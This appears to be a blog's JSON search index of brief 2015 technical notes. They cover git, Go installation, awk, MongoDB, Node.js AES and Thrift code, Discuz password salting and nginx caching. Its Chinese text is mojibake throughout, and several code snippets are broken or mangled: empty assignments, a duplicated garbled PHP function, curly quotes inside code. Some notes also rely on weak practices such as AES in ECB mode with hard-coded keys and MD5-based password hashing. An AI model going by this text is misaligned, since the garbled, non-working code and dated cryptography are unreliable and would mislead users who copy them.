worldâ€)","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"go","slug":"go","permalink":"https://wangxiuwen.github.io/tags/go/"}],"author":"wangxiuwen"},{"title":"go å„ç§ç¼–è¾‘å™¨æ’ä»¶","slug":"history/tech/5953c4d0c2b92f5665eed968","date":"2015-12-11T23:11:50.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed968/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed968/","excerpt":"","text":"https://github.com/golang/go/wiki/IDEsAndTextEditorPlugins","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"go","slug":"go","permalink":"https://wangxiuwen.github.io/tags/go/"}],"author":"wangxiuwen"},{"title":"git -u","slug":"history/tech/5953c4d0c2b92f5665eed967","date":"2015-12-11T22:50:11.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed967/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed967/","excerpt":"","text":"git push -u origin master ç›¸å½“äºgit push origin mastergit branch --set-upstream-to=origin/master master","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"git","slug":"git","permalink":"https://wangxiuwen.github.io/tags/git/"}],"author":"wangxiuwen"},{"title":"refusing to update checked out branch","slug":"history/tech/5953c4d0c2b92f5665eed966","date":"2015-12-11T21:53:49.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed966/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed966/","excerpt":"","text":"&quot;remote:error:refusing to update checked out branch:refs/heads/master&quot;çš„è§£å†³åŠæ³•è¿™æ˜¯ç”±äºgité»˜è®¤æ‹’ç»äº†pushæ“ä½œï¼Œéœ€è¦è¿›è¡Œè®¾ç½®ï¼Œä¿®æ”¹.git/configæ–‡ä»¶åé¢æ·»åŠ å¦‚ä¸‹ä»£ç denyCurrentBranch = ignoreæ— æ³•æŸ¥çœ‹pushåçš„gitä¸­æ–‡ä»¶çš„åŸå› ä¸è§£å†³æ–¹æ³•åœ¨åˆå§‹åŒ–è¿œç¨‹ä»“åº“æ—¶æœ€å¥½ä½¿ç”¨git --bare initä¸€èˆ¬ä¸ªäººä½¿ç”¨ï¼Œç”¨git initï¼Œè¿™æ—¶å€™ä½ çš„å·¥ä½œåŒºä¹Ÿåœ¨è¿™é‡Œã€‚ä½ è¦æ˜¯æƒ³å»ºç«‹ä¸€ä¸ªå›ºå®šçš„åœ°å€è®©å¤§å®¶ä¸€èµ·ç”¨ï¼Œå°±åœ¨æœåŠ¡å™¨ä¸Šç”¨git --bare initã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"git","slug":"git","permalink":"https://wangxiuwen.github.io/tags/git/"}],"author":"wangxiuwen"},{"title":"ab å‹åŠ›æµ‹è¯•","slug":"history/tech/5953c4d0c2b92f5665eed965","date":"2015-12-11T21:50:56.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed965/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed965/","excerpt":"","text":"ab -c 1 -n 1 -T 'application/x-www-form-urlencoded' -p /tmp/abpost -H '33:55' http://127.0.0.1:3000/test","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"å‹åŠ›æµ‹è¯•","slug":"å‹åŠ›æµ‹è¯•","permalink":"https://wangxiuwen.github.io/tags/%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95/"}],"author":"wangxiuwen"},{"title":"windows å®‰è£…go","slug":"history/tech/5953c4d0c2b92f5665eed964","date":"2015-12-11T20:35:06.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed964/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed964/","excerpt":"","text":"ä¸‹è½½ï¼šhttps://golang.orgç¯å¢ƒå˜é‡ï¼šæ–°å»ºGOARCH=386æ–°å»ºGOBIN=D:\\go\\bin ï¼ˆä½ Goå®‰è£…ç›®å½•ï¼‰æ–°å»ºGOOS=windowsæ–°å»ºGOROOT=D:\\goPathè¿½åŠ  ;%GOBIN%; ï¼ˆæ³¨æ„è¦ç”¨åˆ†å·;åˆ†éš”å„ä¸ªPathé¡¹ï¼‰è®¿é—®Goå®‰è£…åŒ…ä¸­çš„æ–‡æ¡£ï¼šcmd &gt; godoc --http=:6060æ‰“å¼€ http://localhost:6060/doc/install.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"go","slug":"go","permalink":"https://wangxiuwen.github.io/tags/go/"}],"author":"wangxiuwen"},{"title":"awk è¿‡æ»¤log","slug":"history/tech/5953c4d0c2b92f5665eed962","date":"2015-12-10T20:42:14.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed962/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed962/","excerpt":"","text":"cat xxx.log |awk -F â€˜(&lt;\\|&gt;)â€™ â€˜{ print $2}â€™ |head -n 1cat log.log |awk -F â€˜(&lt;\\|&gt;)â€™ â€˜{if ($2 ~ /test/) printf(&quot;%s&quot;%s\\n&quot;,$22,$1)}â€™ |awk -Fâ€™(&quot;| - )â€™ â€˜{printf(â€œå†…å®¹ï¼š%s------æ—¶é—´ï¼š%s\\nâ€,$8,$26)}â€™ &gt;&gt; a.txt","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"zcat","slug":"history/tech/5953c4d0c2b92f5665eed961","date":"2015-12-10T20:06:05.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed961/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed961/","excerpt":"","text":"æŸ¥çœ‹å‹ç¼©åŒ…","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"innodb myisam åŒºåˆ«","slug":"history/tech/5953c4d0c2b92f5665eed960","date":"2015-12-10T02:35:20.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed960/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed960/","excerpt":"","text":"innodb myisam åŒºåˆ«","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mysql","slug":"mysql","permalink":"https://wangxiuwen.github.io/tags/mysql/"}],"author":"wangxiuwen"},{"title":"nodejs buffer é™åˆ¶","slug":"history/tech/5953c4d0c2b92f5665eed95f","date":"2015-12-10T02:02:49.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed95f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed95f/","excerpt":"","text":"1G","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nodejs","slug":"nodejs","permalink":"https://wangxiuwen.github.io/tags/nodejs/"}],"author":"wangxiuwen"},{"title":"string æ”¹æ•´å‹","slug":"history/tech/5953c4d0c2b92f5665eed95e","date":"2015-12-09T20:41:14.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed95e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed95e/","excerpt":"","text":"db.shop.find({$type:2}).forEach(function(order){var price = new NumberInt(order.price);db.price.update({_id :order._id}, {$set:{price: price}}, {}); });","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mongodb","slug":"mongodb","permalink":"https://wangxiuwen.github.io/tags/mongodb/"}],"author":"wangxiuwen"},{"title":"æ˜¯å¦æ˜¯æ•°ç»„","slug":"history/tech/5953c4d0c2b92f5665eed95d","date":"2015-12-09T20:34:48.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed95d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed95d/","excerpt":"","text":"function isArray(arr) {return Object.prototype.toString.call(arr) === â€œâ€;}","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nodejs","slug":"nodejs","permalink":"https://wangxiuwen.github.io/tags/nodejs/"}],"author":"wangxiuwen"},{"title":"nodejs aes åŠ å¯†","slug":"history/tech/5953c4d0c2b92f5665eed95c","date":"2015-12-09T20:32:25.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed95c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed95c/","excerpt":"","text":"åŠ å¯†function aesEncrypt(data, key) {var algorithm = â€˜aes-128-ecbâ€™;var clearEncoding = â€˜utf8â€™;var iv = â€œâ€;var cipherEncoding = â€˜hexâ€™;var key = key || â€˜22222222222222222â€™;//key = new Buffer(keyHex, â€˜hexâ€™)try {var cipher = crypto.createCipheriv(algorithm, key, iv);var cipherChunks = [];cipherChunks.push(cipher.update(data, clearEncoding, cipherEncoding));cipherChunks.push(cipher.final(cipherEncoding));return cipherChunks.join(â€™â€™);} catch (e) {return â€˜â€™;}}è§£å¯†ï¼šfunction aesDecrypt(data, key) {var algorithm = â€˜aes-128-ecbâ€™;var clearEncoding = â€˜utf8â€™;var iv = â€œâ€;var cipherEncoding = â€˜hexâ€™;var key = key || â€˜1111111111111111â€™;//key = new Buffer(keyHex, â€˜hexâ€™)try {var decipher = crypto.createDecipheriv(algorithm, key, iv);var plainChunks = [], cipherChunks = ;for (var i = 0; i &lt; cipherChunks.length; i++) {plainChunks.push(decipher.update(cipherChunks, cipherEncoding, clearEncoding));}plainChunks.push(decipher.final(clearEncoding));return plainChunks.join(â€™â€™);} catch (e) {return â€˜â€™;}};","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nodejs","slug":"nodejs","permalink":"https://wangxiuwen.github.io/tags/nodejs/"}],"author":"wangxiuwen"},{"title":"nodejs thrift","slug":"history/tech/5953c4d0c2b92f5665eed95b","date":"2015-12-09T20:30:23.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed95b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed95b/","excerpt":"","text":"nodejs.thriftstruct User {1: i64 uid,2: string username}service Nodejs {User index(1: User user)}client.jsvar thrift = require(â€˜thriftâ€™);var Nodejs = require(â€™./gen-nodejs/Nodejs.jsâ€™);var ttypes = require(â€™./gen-nodejs/nodejs_types.jsâ€™);var connection = thrift.createConnection(â€˜127.0.0.1â€™, 15300);connection.on(â€œerrorâ€,function(e){console.log(e);});var client = thrift.createClient(Nodejs, connection);var user = new ttypes.User({uid: 123,username: â€œwangxiuwenâ€,info: â€˜jiabanâ€™});client.index(user, function(err, res){console.log(res, typeof res);});server.jsvar thrift = require(â€˜thriftâ€™);var Nodejs = require(â€™./gen-nodejs/Nodejs.jsâ€™);var ttypes = require(â€™./gen-nodejs/nodejs_types.jsâ€™);var tf_methods = require(â€™â€¦/models/tf_methods.jsâ€™);var server = thrift.createServer(Nodejs, tf_methods);server.listen(15300);server.on(â€˜errorâ€™,function(e){console.log(â€˜eâ€™,e);});module.exports = tf_methods;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"nodejs","slug":"nodejs","permalink":"https://wangxiuwen.github.io/tags/nodejs/"}],"author":"wangxiuwen"},{"title":"aggregate","slug":"history/tech/5953c4d0c2b92f5665eed958","date":"2015-12-09T03:50:08.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed958/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed958/","excerpt":"","text":"è¿™é‡Œcountå°±æ˜¯ä¸ªé”®å€¼db.users.aggregate()ç¤ºä¾‹ï¼šç”¨æˆ·è¡¨æŸ¥è¯¢æŒ‡å®šæ¡ä»¶çš„äººçš„æ‰‹æœºå·ç var cursor = db.users.aggregate();var mobiles = [];cursor.forEach(functionÂ©{mobiles.push(c._id);});mobiles = mobiles.filter(function(a){return !!a});","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mongodb","slug":"mongodb","permalink":"https://wangxiuwen.github.io/tags/mongodb/"}],"author":"wangxiuwen"},{"title":"w é€‰é¡¹","slug":"history/tech/5953c4d0c2b92f5665eed957","date":"2015-12-09T03:47:45.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed957/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed957/","excerpt":"","text":"wï¼Œwtimeouté€‰é¡¹ï¼Œwä¸º2çš„è¯å°±æ˜¯æ•°æ®å†™å…¥åˆ°primaryå’Œsecondaryæ‰è¿”å›ï¼Œé‚£ä¹ˆfailoverçš„æ—¶å€™å°±ä¸æ€•ä¸¢æ•°æ®","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mongodb","slug":"mongodb","permalink":"https://wangxiuwen.github.io/tags/mongodb/"}],"author":"wangxiuwen"},{"title":"svn æœåŠ¡å™¨é€€ç‰ˆæœ¬","slug":"history/tech/5953c4d0c2b92f5665eed956","date":"2015-12-09T03:41:52.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed956/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed956/","excerpt":"","text":"ç”±äºè¯¯æ“ä½œï¼Œä¸å°å¿ƒå°†é”™è¯¯çš„ä»£ç æäº¤åˆ°äº†svnä¸Šï¼Œäºæ˜¯æƒ³åœ¨æœåŠ¡å™¨ä¸Šæ’¤é”€æœ¬æ¬¡æäº¤ï¼Œç»è¿‡å°è¯•ï¼Œå‘ç°è¿›è¡Œä»¥ä¸‹æ­¥éª¤çš„æ“ä½œå³å¯å½»åº•åˆ é™¤æœ¬æ¬¡æäº¤:1.é¦–å…ˆæ‰¾åˆ°æœ¬æ¬¡æäº¤åç”Ÿæˆçš„ç‰ˆæœ¬å·ï¼Œä¾‹å¦‚ä¸ºr224.2.ç™»å½•åˆ°svnæœåŠ¡å™¨ä¸Šï¼Œè¿›å…¥åˆ°é¡¹ç›®çš„svnç›®å½•.3.è¿›å…¥dbç›®å½•ï¼Œåˆ é™¤æ­¤ç›®å½•ä¸‹çš„rep-cache.dbã€‚å¹¶ä¿®æ”¹æ­¤ç›®å½•ä¸‹çš„currentæ–‡ä»¶ï¼Œå°†å…¶ä¿®æ”¹ä¸ºä¸Šä¸€ä¸ªç‰ˆæœ¬ï¼Œä¾‹å¦‚233.4.åˆ é™¤db/revs/0/ç›®å½•ä¸‹çš„224æ–‡ä»¶ã€‚5.åˆ é™¤db/revprops/0/ç›®å½•ä¸‹çš„224æ–‡ä»¶ã€‚è‡³æ­¤ï¼ŒæœåŠ¡å™¨ç«¯å·²ç»å›é€€åˆ°r223ç‰ˆæœ¬ï¼Œæ­¤æ—¶å¯ä»¥å°†æœ¬åœ°ä¸‹è½½åˆ°çš„ä»£ç åˆ é™¤ï¼Œé‡æ–°ä»svnæœåŠ¡å™¨ä¸Šä¸‹è½½ä¸€ä»½ä»£ç ï¼Œç„¶ååŸºäºæ­¤ä»£ç ç»§ç»­ä¿®æ”¹æäº¤ã€‚å¦‚æœåœ¨windowsä¸‹ä½¿ç”¨TortoiseSVN,è¿˜éœ€è¦åˆ é™¤æœ¬åœ°çš„ç¼“å­˜ï¼Œä¸ç„¶ä¼šå‡ºç°å†æ¬¡æäº¤åï¼Œå…¶æ—¥å¿—æ˜¾ç¤ºå‡ºç°é”™è¯¯çš„æƒ…å†µï¼Œåˆ é™¤æ–¹æ³•ä¸ºç‚¹å‡»TortoiseSVNçš„settings,åœ¨é€‰æ‹©&quot;Saved Data&quot;ï¼Œç‚¹å‡»Clearæ¸…é™¤Log messageå³å¯ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"svn","slug":"svn","permalink":"https://wangxiuwen.github.io/tags/svn/"}],"author":"wangxiuwen"},{"title":"åŠ å¯†æ–¹å¼","slug":"history/tech/5953c4d0c2b92f5665eed95a","date":"2015-12-09T02:47:44.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed95a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed95a/","excerpt":"","text":"ä¸€èˆ¬æˆ‘ä»¬çš„åŠ å¯†éƒ½æ˜¯é‡‡ç”¨md5åŠ å¯†æ–¹å¼ï¼šmd5(å˜é‡)ã€‚ä½†æ˜¯æ˜¨å¤©éœ€è¦æ•´åˆdiscuzçš„è®ºå›ï¼Œçœ‹ä»–çš„åŠ å¯†æ–¹å¼ä¹Ÿåƒæ˜¯md5ï¼Œä½†æ˜¯ç®€å•çš„123åŠ å¯†åç«Ÿç„¶è§£å¯†ä¸å‡ºæ¥ã€‚åæ¥åœ¨ç½‘ä¸ŠæŸ¥äº†ä¸€ä¸‹ï¼Œå‘ç°ä»–ä¸åªæ˜¯ç®€å•çš„md5åŠ å¯†ï¼Œè€Œæ˜¯â€œmd5+éšæœºâ€ã€‚å½“ç„¶è¿™æ ·æ›´å®‰å…¨äº†ã€‚ç½‘ç«™å®‰å…¨äº†ï¼Œç¨‹åºè‡ªç„¶ä¹Ÿå°±å¤æ‚äº†â€¦discuzçš„åŠ å¯†æ–¹å¼ï¼šmd5(md5(password).password).password).salt)ï¼Œsaltæ˜¯ä¸€ä¸ª6ä½éšæœºæ•°ã€‚ æ³¨å†Œçš„æ—¶å€™ï¼ŒæŠŠç”¨æˆ·çš„å¯†ç ç”¨md5(md5(password).salt)åŠ å¯†ï¼Œsaltæ˜¯ä¸€ä¸ª6ä½éšæœºæ•°å­—ï¼Œä¸‹é¢æ˜¯æˆ‘çš„ä¸€ä¸ªè·å–6ä½éšæœºæ•°çš„ä¸€ä¸ªæ–¹æ³•ï¼šfunction randstr($len=6) {$chars=â€˜abcdefghijklmnopqrstuvwxyz0123456789â€™;// characters to build the password frommt_srand((double)microtime()1000000getmypid());// seed the random number generater (must be done)password=â€²â€²;while(strlen(password=&#x27;&#x27;; while(strlen(password=â€‹â€²â€²â€‹â€‹;while(strlen(password)&lt;$len)password.=substr(password.=substr(password.=substr(chars,(mt_rand()%strlen($chars)),1);return $password;}salt=randstr();æŠŠrandstr()èµ‹å€¼ç»™saltï¼Œç„¶åç”¨md5(md5(ä¼šå‘˜æäº¤çš„å¯†ç ).salt)åŠ å¯†å°±å¯ä»¥äº†ï¼Œä½†æ˜¯åƒä¸‡ä¸è¦å¿˜äº†æŠŠsaltå…¥åº“å“¦ï¼ˆuc_membersè¡¨ï¼‰ã€‚ç™»é™†çš„æ—¶å€™æ ¹æ®ç”¨æˆ·åæŠŠsaltå–å‡ºæ¥ï¼Œç”¨md5(md5(ä¼šå‘˜æäº¤çš„å¯†ç ).salt)åŒ¹é…å¯†ç ï¼Œå¦‚æœä¸€æ ·å°±ç™»é™†æˆåŠŸäº†","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"discuz","slug":"discuz","permalink":"https://wangxiuwen.github.io/tags/discuz/"}],"author":"wangxiuwen"},{"title":"nodejs thrift","slug":"history/tech/5953c4d0c2b92f5665eed955","date":"2015-12-09T02:37:41.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed955/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed955/","excerpt":"","text":"http://linmomo02.iteye.com/blog/1306920https://cnodejs.org/topic/51bec17760af11cd336d5831http://uule.iteye.com/blog/2223730http://www.cnblogs.com/johnc/archive/2011/06/19/2084508.htmlhttp://www.cnblogs.com/tianhuilove/archive/2011/09/05/2167669.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"thrift","slug":"thrift","permalink":"https://wangxiuwen.github.io/tags/thrift/"}],"author":"wangxiuwen"},{"title":"å¤šçº§ç›®å½•è§£å†³æ–¹æ¡ˆ","slug":"history/tech/5953c4d0c2b92f5665eed954","date":"2015-12-09T02:30:53.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed954/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed954/","excerpt":"","text":"function __format(data){var tmp = {},lvIdArr = [];for(i in data){if(!lvIdArr[data.lv]){lvIdArr[data.lv] = [];}lvIdArr[data.lv].push(data.id);tmp[data.id] = data;}var dataArr = [],len = lvIdArr.length;for(i = len;i &gt;0;iâ€“){lvIdArr.forEach(function(id){if(dataArr){dataArr.child.push(tmp);}else{dataArr = tmp[tmp.pid];dataArr.child = [];}});}return dataArr;}var data = ;function __format(data){var tmp = {},lvIdArr = [];for(i in data){if(!lvIdArr[data.lv]){lvIdArr[data.lv] = [];}lvIdArr[data.lv].push(data.id);tmp[data.id] = data;}var dataArr = [],len = lvIdArr.length;for(i = len - 1;i &gt;=0;â€“i){(lvIdArr || []).forEach(function(id){if(dataArr){dataArr.child.push(tmp);}else{dataArr = tmp[tmp.pid] || tmp;dataArr.child = [];}});}return dataArr;}__format(data);var data = ;function __format(data){var tmp = {},lvIdArr = [];for(i in data){if(!lvIdArr[data.lv]){lvIdArr[data.lv] = [];}lvIdArr[data.lv].push(data.id);tmp[data.id] = data;}var dataArr = [],len = lvIdArr.length;for(i = len - 1;i &gt;=0;â€“i){(lvIdArr || []).forEach(function(id){//itemçš„idif(i == 0){dataArr.push(tmp);}else{if(!tmp[tmp.pid].child){tmp[tmp.pid].child = [];}tmp[tmp.pid].child.push(tmp);}});}return dataArr;}__format(data);","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"javascript","slug":"javascript","permalink":"https://wangxiuwen.github.io/tags/javascript/"}],"author":"wangxiuwen"},{"title":"ç¼“å­˜","slug":"history/tech/5953c4d0c2b92f5665eed953","date":"2015-12-09T02:27:02.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eed953/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eed953/","excerpt":"","text":"add_header X-Cache $upstream_cache_status;http://zyan.cc/nginx_cache/2/1/http://linux.it.net.cn/e/server/nginx/2015/0314/13930.htmlhttp://www.dnzsb.com/article-3943-1.html1ï¼‰./configure: error: ngx_http_lua_module requires the Lua library.è§£å†³æ–¹æ³•ï¼šyum install -y 